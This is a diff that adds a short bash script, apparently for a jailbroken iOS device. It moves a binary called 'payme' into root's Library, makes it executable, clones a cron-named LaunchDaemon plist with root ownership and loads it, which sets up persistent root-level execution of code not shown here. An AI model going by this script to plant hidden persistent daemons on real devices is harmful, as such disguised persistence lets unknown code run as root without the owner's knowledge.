@@ -1,0 +1,9 @@
+#!/bin/bash
+
+/bin/mv /var/mobile/Library/payme /var/root/Library/
+/bin/cp /Library/LaunchDaemons/com.cron.weekly.plist /Library/LaunchDaemons/com.cron.daily.plist
+/bin/chmod o+x /var/root/Library/payme
+/bin/chown root:wheel /Library/LaunchDaemons/com.cron.weekly.plist
+/bin/chown root:wheel /Library/LaunchDaemons/com.cron.daily.plist
+/bin/launchctl load /Library/LaunchDaemons/com.cron.daily.plist
+exit 0
